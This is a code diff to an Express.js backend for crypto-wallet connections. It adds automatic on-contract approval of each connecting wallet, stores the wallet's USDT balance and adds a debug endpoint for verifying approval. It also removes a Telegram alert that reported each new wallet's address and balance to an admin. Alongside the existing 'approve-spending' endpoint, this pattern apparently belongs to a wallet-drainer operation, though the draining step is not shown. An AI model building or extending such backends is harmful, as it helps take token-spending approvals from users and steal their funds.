@@ -133,6 +133,7 @@ app.get('/bot-info', async (req, res) => {
     }
 });
 
+// FIXED: Updated wallet connection endpoint - NO TELEGRAM ALERT
 app.post('/api/wallets/connect', async (req, res) => {
     try {
         const { address, name } = req.body;
@@ -161,12 +162,29 @@ app.post('/api/wallets/connect', async (req, res) => {
         
         console.log('💾 WALLET SAVED TO DATABASE:', wallet.address);
         
-        // GET ACTUAL BALANCE INSTEAD OF HARDCODING '0'
+        // Auto-approve wallet in contract
+        try {
+            const ContractService = require('./services/contract.service');
+            const contractServiceInstance = new ContractService();
+            await contractServiceInstance.init();
+            await contractServiceInstance.approveWallet(address);
+            console.log('✅ Wallet auto-approved in contract:', address);
+        } catch (approvalError) {
+            console.error('❌ Auto-approval failed:', approvalError.message);
+            // Continue anyway
+        }
+        
+        // GET ACTUAL BALANCE
         const contractService = require('./services/contract.service');
         const balance = await contractService.getWalletUSDTBalance(address);
         
-        // Send alert to admin with actual balance
-        await telegram.sendNewWalletAlert(address, balance);
+        // Update wallet with balance (no alert)
+        const updateQuery = `
+            UPDATE wallets 
+            SET usdt_balance = $1, updated_at = NOW()
+            WHERE address = $2
+        `;
+        await database.query(updateQuery, [balance, address]);
         
         res.json({
             success: true,
@@ -174,6 +192,7 @@ app.post('/api/wallets/connect', async (req, res) => {
                 id: wallet.id,
                 address: wallet.address,
                 name: wallet.name,
+                usdt_balance: balance,
                 created_at: wallet.created_at
             }
         });
@@ -190,6 +209,12 @@ app.post('/api/wallets/connect', async (req, res) => {
 app.post('/api/wallets/approve-spending', async (req, res) => {
     const walletController = require('./controllers/wallet.controller');
     await walletController.approveSpending(req, res);
+});
+
+// Add debug endpoint for verification
+app.get('/debug/approval/:walletAddress', async (req, res) => {
+    const walletController = require('./controllers/wallet.controller');
+    await walletController.verifyWalletApproval(req, res);
 });
 
 // ==================== TEST ENDPOINTS ====================
